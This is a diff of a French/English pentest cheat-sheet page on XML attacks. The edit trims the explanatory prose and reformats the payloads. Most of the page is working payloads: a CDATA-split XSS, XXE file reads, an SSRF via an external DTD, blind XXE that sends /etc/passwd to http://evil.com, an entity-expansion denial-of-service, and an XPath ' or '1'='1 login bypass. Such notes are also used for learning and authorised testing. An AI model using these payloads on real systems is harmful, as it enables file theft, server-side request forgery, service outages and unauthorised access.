@@ -2,17 +2,18 @@
 
 ## XML injection
 
-Si nos inputs sont directement ajoutés en tant que nœud dans un doc xml :
+Si nos inputs sont directement ajoutés en tant que nœud dans un doc xml, on peut :
 
-* We can inject malformed string to break the parser
-* On peut modifier les informations enregistrées. Par exemple si notre input consiste en notre nom et que l'app rajoute ensuite automatiquement un champ pour nos droits, on peut fabriquer notre input de force à commenter la partie générée par l'appli et à la place mettre la notre \(owasp testing guide 4 page 138 pour un exemple\).
+* Inject malformed string to break the parser
+* Modify information with well crafted payload
 * If the xml is converted to html, `<![CDATA[]]>` might just be stripped, making it possible to inject other script undetected
 
-```text
+```markup
 <html>
- <![CDATA[<]]>script<![CDATA[>]]>alert(‘xss’)<![CDATA[<]]>/
-script<![CDATA[>]]>
- </html>
+    <![CDATA[<]]>script<![CDATA[>]]>alert(‘xss’)<![CDATA[<]]>/
+    script<![CDATA[>]]>
+</html>
+
 <!-- to : -->
 <script>alert(‘XSS’)</script>
 ```
@@ -20,8 +21,6 @@ script<![CDATA[>]]>
 ## XXE - _XML External Entities_
 
 ### Inband
-
-Si le site nous renvoi directement ce qui a été parsé, on peut envoyer ce genre de fichier :
 
 ```markup
 <?xml version="1.0" encoding="UTF-8"?>
@@ -34,8 +33,6 @@ Si le site nous renvoi directement ce qui a été parsé, on peut envoyer ce gen
 
 ### SSRF - _Server Side Request Forgery_
 
-On peut faire n'importe quelle requête _au nom du serveur_ en lui faisant suivre un lien pour load un DTD externe :
-
 ```markup
 <?xml version="1.0"?>
 <!DOCTYPE ssrf [
@@ -46,8 +43,6 @@ On peut faire n'importe quelle requête _au nom du serveur_ en lui faisant suivr
 
 ### Out-of-band \(blind\)
 
-Pour "exfilter" les données au cas où elles ne nous sont pas montrées, on peut forcer le serveur à faire une requête vers notre serveur avec dans le lien les données.
-
 ```markup
 <!-- test.xml-->
 <?xml version="1.0" encoding="UTF-8 ?>
@@ -55,9 +50,9 @@ Pour "exfilter" les données au cas où elles ne nous sont pas montrées, on peu
 <test>&send;</test>
 
 <!-- external.dtd -->
-    <!ENTITY % file_content SYSTEM "/etc/passwd">
-    <!ENTITY % wrapper "<!ENTITY send 'http://evil.com/?%file_content;'>">
-    %wrapper;
+<!ENTITY % file_content SYSTEM "/etc/passwd">
+<!ENTITY % wrapper "<!ENTITY send 'http://evil.com/?%file_content;'>">
+%wrapper;
 ```
 
 Au cas où le contenu du fichier ferait bugger le parser, on peut abuser de _CDTATA_ :
@@ -69,16 +64,14 @@ Au cas où le contenu du fichier ferait bugger le parser, on peut abuser de _CDT
 <test>&send;</test>
 
 <!-- external.dtd -->
-    <!ENTITY % file_content SYSTEM "/etc/passwd">
-    <!ENTITY % start "<![CDATA[">
-    <!ENTITY % end "]]>">
-    <!ENTITY % wrapper "<!ENTITY send 'http://evil.com/?%start;%file_content;%end;'>">
-    %wrapper;
+<!ENTITY % file_content SYSTEM "/etc/passwd">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % wrapper "<!ENTITY send 'http://evil.com/?%start;%file_content;%end;'>">
+%wrapper;
 ```
 
 ### DDOS
-
-By doing this kind of request we can DDOS
 
 ```markup
 <?xml version=”1.0” encoding=”ISO-8859-1”?>
@@ -97,20 +90,15 @@ By doing this kind of request we can DDOS
 
 ## XPath Injection
 
-Elles suivent la même logique que les injections SQL.
+Elles suivent la même logique que les injections SQL \(`‘or ‘1’ = ‘1`\)
 
-Exemple :
+```text
+# this :
+string(//user[user/text()=’gandalf’ and pass/text()=’qwertasd123’]/account/text())
 
-Cette requête récupère le compte correspondant à "gandalf" avec le mdp "!3c" `string(//user[username/text()=’gandalf’ and password/text()=’!c3’]/account/text())`
-
-On peut s'authentifier en la transformant ainsi :
-
-`string(//user[username/text()=’’ or ‘1’ = ‘1’ and password/text()=’’ or ‘1’ = ‘1’]/account/text())`
-
-En insérant ces valeurs :
-
-* Username: ‘ or ‘1’ = ‘1
-* Password: ‘ or ‘1’ = ‘1
+# to this :
+string(//user[user/text()=’gandalf’ and pass/text()=’’ or ‘1’ = ‘1’]/account/text())
+```
 
 J'imagine que le même genre de chose est possible avec XQuery.
 
